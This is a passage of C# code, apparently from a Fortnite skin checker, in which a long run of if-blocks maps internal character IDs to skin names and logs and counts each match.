                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck39 = x.Contains("AthenaCharacter:cid_191_athena_commando_m_sushichef");
                            if (NewSkinsCheck39)
                            {
                                sw.WriteLine("=> Sushi Master");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sushi Master");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck40 = x.Contains("AthenaCharacter:cid_192_athena_commando_m_hippie");
                            if (NewSkinsCheck40)
                            {
                                sw.WriteLine("=> Far Out Man");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Far Out Man");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck41 = x.Contains("AthenaCharacter:cid_193_athena_commando_f_hippie");
                            if (NewSkinsCheck41)
                            {
                                sw.WriteLine("=> Dreamflower");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dreamflower");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck42 = x.Contains("AthenaCharacter:cid_194_athena_commando_f_ravenquill");
                            if (NewSkinsCheck42)
                            {
                                sw.WriteLine("=> Ravage");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ravage");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck43 = x.Contains("AthenaCharacter:cid_195_athena_commando_f_bling");
                            if (NewSkinsCheck43)
                            {
                                sw.WriteLine("=> The Ace");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> The Ace");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck44 = x.Contains("AthenaCharacter:cid_196_athena_commando_m_biker");
                            if (NewSkinsCheck44)
                            {
                                sw.WriteLine("=> Backbone");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Backbone");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck45 = x.Contains("AthenaCharacter:cid_197_athena_commando_f_biker");
                            if (NewSkinsCheck45)
                            {
                                sw.WriteLine("=> Chopper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chopper");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck46 = x.Contains("AthenaCharacter:cid_198_athena_commando_m_bluesamurai");
                            if (NewSkinsCheck46)
                            {
                                sw.WriteLine("=> Musha");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Musha");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck47 = x.Contains("AthenaCharacter:cid_199_athena_commando_f_bluesamurai");
                            if (NewSkinsCheck47)
                            {
                                sw.WriteLine("=> Hime");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hime");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck48 = x.Contains("AthenaCharacter:cid_200_athena_commando_m_darkpaintballer");
                            if (NewSkinsCheck48)
                            {
                                sw.WriteLine("=> Enforcer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Enforcer");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck49 = x.Contains("AthenaCharacter:cid_201_athena_commando_m_desertops");
                            if (NewSkinsCheck49)
                            {
                                sw.WriteLine("=> Armadillo");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Armadillo");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck50 = x.Contains("AthenaCharacter:cid_202_athena_commando_f_desertops");
                            if (NewSkinsCheck50)
                            {
                                sw.WriteLine("=> Scorpion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scorpion");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck51 = x.Contains("AthenaCharacter:cid_203_athena_commando_m_cloakedstar");
                            if (NewSkinsCheck51)
                            {
                                sw.WriteLine("=> Cloaked Star");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cloaked Star");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck52 = x.Contains("AthenaCharacter:cid_204_athena_commando_m_garageband");
                            if (NewSkinsCheck52)
                            {
                                sw.WriteLine("=> Stage Slayer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stage Slayer");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck53 = x.Contains("AthenaCharacter:cid_205_athena_commando_f_garageband");
                            if (NewSkinsCheck53)
                            {
                                sw.WriteLine("=> Synth Star");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Synth Star");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck54 = x.Contains("AthenaCharacter:cid_206_athena_commando_m_bling");
                            if (NewSkinsCheck54)
                            {
                                sw.WriteLine("=> Wild Card");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wild Card");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck55 = x.Contains("AthenaCharacter:cid_216_athena_commando_f_medic");
                            if (NewSkinsCheck55)
                            {
                                sw.WriteLine("=> Field Surgeon");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Field Surgeon");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck56 = x.Contains("AthenaCharacter:cid_217_athena_commando_m_medic");
                            if (NewSkinsCheck56)
                            {
                                sw.WriteLine("=> Triage Trooper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Triage Trooper");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck57 = x.Contains("AthenaCharacter:cid_218_athena_commando_m_greenberet");
                            if (NewSkinsCheck57)
                            {
                                sw.WriteLine("=> Garrison");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Garrison");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck58 = x.Contains("AthenaCharacter:cid_219_athena_commando_m_hacivat");
                            if (NewSkinsCheck58)
                            {
                                sw.WriteLine("=> Hacivat");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hacivat");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck59 = x.Contains("AthenaCharacter:cid_184_athena_commando_m_durrburgerworker");
                            if (NewSkinsCheck59)
                            {
                                sw.WriteLine("=> Grill Sergeant");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Grill Sergeant");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck60 = x.Contains("AthenaCharacter:cid_221_athena_commando_m_clown");
                            if (NewSkinsCheck60)
                            {
                                sw.WriteLine("=> Nite Nite");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Nite Nite");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck61 = x.Contains("AthenaCharacter:cid_222_athena_commando_f_darkviking");
                            if (NewSkinsCheck61)
                            {
                                sw.WriteLine("=> Valkyrie");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Valkyrie");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck62 = x.Contains("AthenaCharacter:cid_174_athena_commando_f_carbidewhite");
                            if (NewSkinsCheck62)
                            {
                                sw.WriteLine("=> Eon");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Eon");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck63 = x.Contains("AthenaCharacter:cid_183_athena_commando_m_modernmilitaryred");
                            if (NewSkinsCheck63)
                            {
                                sw.WriteLine("=> Double Helix");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Double Helix");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck64 = x.Contains("AthenaCharacter:cid_220_athena_commando_f_clown");
                            if (NewSkinsCheck64)
                            {
                                sw.WriteLine("=> Peekaboo");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Peekaboo");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck65 = x.Contains("AthenaCharacter:cid_223_athena_commando_m_dieselpunk");
                            if (NewSkinsCheck65)
                            {
                                sw.WriteLine("=> Maximillian");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Maximillian");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck66 = x.Contains("AthenaCharacter:cid_224_athena_commando_f_dieselpunk");
                            if (NewSkinsCheck66)
                            {
                                sw.WriteLine("=> Airheart");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Airheart");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck67 = x.Contains("AthenaCharacter:cid_225_athena_commando_m_octoberfest");
                            if (NewSkinsCheck67)
                            {
                                sw.WriteLine("=> Ludwig");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ludwig");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck68 = x.Contains("AthenaCharacter:cid_226_athena_commando_f_octoberfest");
                            if (NewSkinsCheck68)
                            {
                                sw.WriteLine("=> Heidi");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Heidi");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck69 = x.Contains("AthenaCharacter:cid_227_athena_commando_f_vampire");
                            if (NewSkinsCheck69)
                            {
                                sw.WriteLine("=> Dusk");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dusk");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck70 = x.Contains("AthenaCharacter:cid_230_athena_commando_m_werewolf");
                            if (NewSkinsCheck70)
                            {
                                sw.WriteLine("=> Dire");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dire");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck71 = x.Contains("AthenaCharacter:cid_231_athena_commando_f_redriding");
                            if (NewSkinsCheck71)
                            {
                                sw.WriteLine("=> Fable");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fable");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck72 = x.Contains("AthenaCharacter:cid_232_athena_commando_f_halloweentomato");
                            if (NewSkinsCheck72)
                            {
                                sw.WriteLine("=> Nightshade");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Nightshade");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck73 = x.Contains("AthenaCharacter:cid_233_athena_commando_m_fortnitedj");
                            if (NewSkinsCheck73)
                            {
                                sw.WriteLine("=> Dj Yonder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dj Yonder");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck74 = x.Contains("AthenaCharacter:cid_234_athena_commando_m_llamarider");
                            if (NewSkinsCheck74)
                            {
                                sw.WriteLine("=> Giddy-up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Giddy-up");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck75 = x.Contains("AthenaCharacter:cid_237_athena_commando_f_cowgirl");
                            if (NewSkinsCheck75)
                            {
                                sw.WriteLine("=> Calamity");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Calamity");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck76 = x.Contains("AthenaCharacter:cid_229_athena_commando_f_darkbomber");
                            if (NewSkinsCheck76)
                            {
                                sw.WriteLine("=> Dark Bomber");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Bomber");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck77 = x.Contains("AthenaCharacter:cid_235_athena_commando_m_scarecrow");
                            if (NewSkinsCheck77)
                            {
                                sw.WriteLine("=> Hay Man");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hay Man");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck78 = x.Contains("AthenaCharacter:cid_236_athena_commando_f_scarecrow");
                            if (NewSkinsCheck78)
                            {
                                sw.WriteLine("=> Straw Ops");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Straw Ops");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck79 = x.Contains("AthenaCharacter:cid_240_athena_commando_f_plague");
                            if (NewSkinsCheck79)
                            {
                                sw.WriteLine("=> Scourge");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scourge");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck80 = x.Contains("AthenaCharacter:cid_241_athena_commando_m_plague");
                            if (NewSkinsCheck80)
                            {
                                sw.WriteLine("=> Plague");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Plague");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck81 = x.Contains("AthenaCharacter:cid_242_athena_commando_f_bullseye");
                            if (NewSkinsCheck81)
                            {
                                sw.WriteLine("=> Bullseye");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bullseye");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck82 = x.Contains("AthenaCharacter:cid_243_athena_commando_m_pumpkinslice");
                            if (NewSkinsCheck82)
                            {
                                sw.WriteLine("=> Hollowhead");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hollowhead");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck83 = x.Contains("AthenaCharacter:cid_244_athena_commando_m_pumpkinsuit");
                            if (NewSkinsCheck83)
                            {
                                sw.WriteLine("=> Jack Gourdon");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jack Gourdon");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck84 = x.Contains("AthenaCharacter:cid_246_athena_commando_f_grave");
                            if (NewSkinsCheck84)
                            {
                                sw.WriteLine("=> Skull Ranger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Skull Ranger");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck85 = x.Contains("AthenaCharacter:cid_228_athena_commando_m_vampire");
                            if (NewSkinsCheck85)
                            {
                                sw.WriteLine("=> Sanctum");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sanctum");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck86 = x.Contains("AthenaCharacter:cid_247_athena_commando_m_guanyu");
                            if (NewSkinsCheck86)
                            {
                                sw.WriteLine("=> Guan Yu");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Guan Yu");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck87 = x.Contains("AthenaCharacter:cid_248_athena_commando_m_blackwidow");
                            if (NewSkinsCheck87)
                            {
                                sw.WriteLine("=> Spider Knight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spider Knight");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck88 = x.Contains("AthenaCharacter:cid_249_athena_commando_f_blackwidow");
                            if (NewSkinsCheck88)
                            {
                                sw.WriteLine("=> Arachne");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Arachne");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck89 = x.Contains("AthenaCharacter:cid_250_athena_commando_m_evilcowboy");
                            if (NewSkinsCheck89)
                            {
                                sw.WriteLine("=> Deadfire");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Deadfire");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck90 = x.Contains("AthenaCharacter:cid_251_athena_commando_f_muertos");
                            if (NewSkinsCheck90)
                            {
                                sw.WriteLine("=> Rosa");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rosa");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck91 = x.Contains("AthenaCharacter:cid_252_athena_commando_m_muertos");
                            if (NewSkinsCheck91)
                            {
                                sw.WriteLine("=> Dante");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dante");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck92 = x.Contains("AthenaCharacter:cid_253_athena_commando_m_militaryfashion2");
                            if (NewSkinsCheck92)
                            {
                                sw.WriteLine("=> Summit Striker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Summit Striker");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck93 = x.Contains("AthenaCharacter:cid_254_athena_commando_m_zombie");
                            if (NewSkinsCheck93)
                            {
                                sw.WriteLine("=> Brainiac");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Brainiac");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck94 = x.Contains("AthenaCharacter:cid_256_athena_commando_m_pumpkin");
                            if (NewSkinsCheck94)
                            {
                                sw.WriteLine("=> Patch Patroller");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Patch Patroller");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck95 = x.Contains("AthenaCharacter:cid_261_athena_commando_m_raptorarcticcamo");
                            if (NewSkinsCheck95)
                            {
                                sw.WriteLine("=> Frostbite");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frostbite");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck96 = x.Contains("AthenaCharacter:cid_041_athena_commando_f_district");
                            if (NewSkinsCheck96)
                            {
                                sw.WriteLine("=> Dominator");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dominator");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck97 = x.Contains("AthenaCharacter:cid_078_athena_commando_m_camo");
                            if (NewSkinsCheck97)
                            {
                                sw.WriteLine("=> Highrise Assault Trooper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Highrise Assault Trooper");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck98 = x.Contains("AthenaCharacter:cid_010_athena_commando_m");
                            if (NewSkinsCheck98)
                            {
                                sw.WriteLine("=> Ranger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ranger");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck99 = x.Contains("AthenaCharacter:cid_014_athena_commando_f");
                            if (NewSkinsCheck99)
                            {
                                sw.WriteLine("=> Pathfinder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pathfinder");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck100 = x.Contains("AthenaCharacter:cid_075_athena_commando_f_stripe");
                            if (NewSkinsCheck100)
                            {
                                sw.WriteLine("=> Tactics Officer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tactics Officer");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck101 = x.Contains("AthenaCharacter:cid_111_athena_commando_f_robo");
                            if (NewSkinsCheck101)
                            {
                                sw.WriteLine("=> Steelsight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Steelsight");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck102 = x.Contains("AthenaCharacter:cid_026_athena_commando_m");
                            if (NewSkinsCheck102)
                            {
                                sw.WriteLine("=> Desperado");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Desperado");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck103 = x.Contains("AthenaCharacter:cid_019_athena_commando_m");
                            if (NewSkinsCheck103)
                            {
                                sw.WriteLine("=> Infiltrator");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Infiltrator");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck104 = x.Contains("AthenaCharacter:cid_079_athena_commando_f_camo");
                            if (NewSkinsCheck104)
                            {
                                sw.WriteLine("=> Tower Recon Specialist");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tower Recon Specialist");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck105 = x.Contains("AthenaCharacter:cid_262_athena_commando_m_madcommander");
                            if (NewSkinsCheck105)
                            {
                                sw.WriteLine("=> Ruckus");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ruckus");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck106 = x.Contains("AthenaCharacter:cid_263_athena_commando_f_madcommander");
                            if (NewSkinsCheck106)
                            {
                                sw.WriteLine("=> Mayhem");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mayhem");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck107 = x.Contains("AthenaCharacter:cid_257_athena_commando_m_samuraiultra");
                            if (NewSkinsCheck107)
                            {
                                sw.WriteLine("=> Shogun");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shogun");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck108 = x.Contains("AthenaCharacter:cid_258_athena_commando_f_fuzzybearhalloween");
                            if (NewSkinsCheck108)
                            {
                                sw.WriteLine("=> Spooky Team Leader");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spooky Team Leader");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck109 = x.Contains("AthenaCharacter:cid_259_athena_commando_m_streetops");
                            if (NewSkinsCheck109)
                            {
                                sw.WriteLine("=> Reflex");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Reflex");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck110 = x.Contains("AthenaCharacter:cid_260_athena_commando_f_streetops");
                            if (NewSkinsCheck110)
                            {
                                sw.WriteLine("=> Instinct");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Instinct");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck111 = x.Contains("AthenaCharacter:cid_264_athena_commando_m_animaljackets");
                            if (NewSkinsCheck111)
                            {
                                sw.WriteLine("=> Growler");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Growler");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck112 = x.Contains("AthenaCharacter:cid_265_athena_commando_f_animaljackets");
                            if (NewSkinsCheck112)
                            {
                                sw.WriteLine("=> Flapjackie");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flapjackie");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
                                TotalSkins = TotalSkins + 1;
                            }
                            bool NewSkinsCheck114 = x.Contains("AthenaCharacter:cid_266_athena_commando_f_llamarider");
                            if (NewSkinsCheck114)
                            {
                                sw.WriteLine("=> Yee-haw!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Yee-haw!");
                                }
                                Interlocked.Increment(ref TotalSkinsChecked);
